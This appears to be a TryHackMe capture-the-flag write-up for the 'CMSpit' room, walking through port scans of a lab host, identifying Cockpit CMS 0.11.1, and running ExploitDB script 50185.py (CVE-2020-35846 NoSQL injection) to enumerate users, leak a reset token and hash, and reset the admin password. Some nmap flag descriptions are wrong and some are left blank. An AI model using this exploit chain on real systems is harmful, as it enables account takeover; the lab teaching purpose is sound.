<h1 align="center">CMSpit<br><img width="1200px" src=""></h1>
<p align="center">June 18, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>This is a machine that allows you to practise web app hacking and privilege escalation using recent vulnerabilities.</em><br>
Click <a href="https://tryhackme.com/room/cmspit">here </a>to access the "room".<br>
<img width="80px" src="https://github.com/user-attachments/assets/5d595d6b-e29e-4ce1-9c1d-6bc04341b4d2"><br></p>

<h2> Task 1 . Ready Set Go</h2>
<p>You've identified that the CMS installed on the web server has several vulnerabilities that allow attackers to enumerate users and change account passwords.<br>

Your mission is to exploit these vulnerabilities and compromise the web server.</p>

<h4 align="left"> Answer the question below</h4>

> 1.1. <em>What is the name of the Content Management System (CMS) installed on the server?</em><br><a id='1.1'></a>
>> <strong><code>_________</code></strong><br>
<p></p>

<br>

<br>

<h3>nmap</h3>
<p>
  
- <code>-sS</code> = executes a set of default Nmap Scripting Engine (NSE) scripts to gather more informatio<br>
- <code>-sC</code> = equivalent to --script=default<br>
- <code>-sV</code> = dDetermines the versions of services running on open ports<br>
- <code>-p</code> = scan all ports<br>
- <code>-A</code> = used for aggressive scanning, enabling a combination of OS detection, version detection, script scanning, and traceroute<br>
- <code>-Pn</code> = treat all hosts as online -- skip host discovery</p>


```bash
:~# nmap -Pn -p- 10.10.72.83
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
:~# nmap -sC -sV -p- 10.10.72.83
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

```bash
:~# nmap -A -Pn -p- 10.10.72.83
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

<h3>rustscan</h3>
<p>
  
- <code>-a</code> = __br>
- <code>-b</code> = __<br>
- <code>-A</code> = __<br> 
- <code>--ulimit</code> = ___</p>


```bash
:~# rustscan -a 10.10.72.83 --ulimit 5500 -b 65535 -- -A -Pn
...
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7acH8krj6oVh6s+R3VYnJ/Xc8o5b43RcrRwiMPKe7V8V/SLfeVeHtE06j0PnfF5bHbNjtLP8pMq2USPivt/LcsS+8e+F5yfFFAVawOWqtd9tnrXVQhmyLZVb+wzmjKe+BaNWSnEazjIevMjD3bR8YBYKnf2BoaFKxGkJKPyleMT1GAkU+r47m2FsMa+l7p79VIYrZfss3NTlRq9k6pGsshiJnnzpWmT1KDjI90fGT6oIkALZdW/++qXi+px6+bWDMiW9NVv0eQmN9eTwsFNoWE3JDG7Aeq7hacqF7JyoMPegQwAAHI/ZD66f4zQzqQN6Ou6+sr7IMkC62rLMjKkXN
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEnbbSTSHNXi6AcEtMnOG+srCrE2U4lbRXkBxlQMk1damlhG+U0tmiObRCoasyBY2kvAdU/b7ZWoE0AmoYUldvk=
|   256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYUS/4ObKPMEyPGlgqg6khm41SWn61X9kGbNvyBJh7e
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: C9CD46C6A2F5C65855276A03FE703735
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
...
```

<h3><code>http://TargetIP</code> redirects to <code>http://TargetIP/auth/login?to=/</code></h3>

![image](https://github.com/user-attachments/assets/c3c29bfb-03ae-4b6e-908a-0ad19033dde1)

<p>Identified in page source ...</p>

```bash
App.request('/auth/check', {
                    auth : {user:this.refs.user.value, password:this.refs.password.value },
                    csfr : "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
                }).then(function(data) {
```

![image](https://github.com/user-attachments/assets/4522b1d6-6370-472d-b98f-461171f70ce5)

```bash
<p class="uk-text-center" if="{!$user}"><a class="uk-button uk-button-link uk-link-muted" href="/auth/forgotpassword">Forgot Password?</a></p>
```

![image](https://github.com/user-attachments/assets/c226ac39-294a-46ed-8d77-3eb7076ebb8f)

<p>https://jwt.io</p>

<p><em>Decoded Header</em></p>

```bash
{
  "typ": "JWT",
  "alg": "HS256"
}
```

<p><em>Decoded Payload</em></p>
```bash
{
  "csfr": "login"
}
```

![image](https://github.com/user-attachments/assets/f7c28cdd-dff4-4c4d-a3ad-5eb20883bf41)

<h3><code>http://TargetIP/auth/forgotpassword</code></h3>

![image](https://github.com/user-attachments/assets/576fe691-b089-4e89-bae3-b932174746e9)

<p>page source --> version 0.11.1</p>

![image](https://github.com/user-attachments/assets/afa79251-5237-4caf-89f0-bca12b01d67e)

<h3>ExploitdB</h3>

![image](https://github.com/user-attachments/assets/e3d06c91-a4fe-47ec-85a7-be066ee95809)

<p>Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection</p>

![image](https://github.com/user-attachments/assets/08d645cc-6e93-47dd-a16d-ebb00d31852a)

<p>50185.py</p>

![image](https://github.com/user-attachments/assets/c5b4249f-809e-4e80-b7e1-e100ef89fc15)


<p><code>admin </code> : <code>$<#aV+G^4l</code></p>

```bash
:~# python3 50185.py -u http://TargetIP
[+] http://10.10.72.83: is reachable
[-] Attempting Username Enumeration (CVE-2020-35846) : 

[+] Users Found : ['admin', 'darkStar7471', 'skidy', 'ekoparty']

[-] Get user details For : admin
[+] Finding Password reset tokens
	 Tokens Found : ['rp-f0e0da4918ff68086b026f4e9356c33468530b1edbb5c']
[+] Obtaining user information 
-----------------Details--------------------
	 [*] user : admin
	 [*] name : Admin
	 [*] email : admin@yourdomain.de
	 [*] active : True
	 [*] group : admin
	 [*] password : $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
	 [*] i18n : en
	 [*] _created : 1621655201
	 [*] _modified : 1621655201
	 [*] _id : 60a87ea165343539ee000300
	 [*] _reset_token : rp-f0e0da4918ff68086b026f4e9356c33468530b1edbb5c
	 [*] md5email : a11eea8bf873a483db461bb169beccec
--------------------------------------------


[+] Do you want to reset the passowrd for admin? (Y/n): Y
[-] Attempting to reset admin's password:
[+] Password Updated Succesfully!
[+] The New credentials for admin is: 
 	 Username : admin 
 	 Password : $<#aV+G^4l
```

<p>Logged in as <code>admin</code> in <code>>http://TargetIP/auth/login?to=/</code></p>

![image](https://github.com/user-attachments/assets/8b4e59c5-6275-4466-90a2-efbe28407c66)


```bash
TargetIP olympus.thm
```

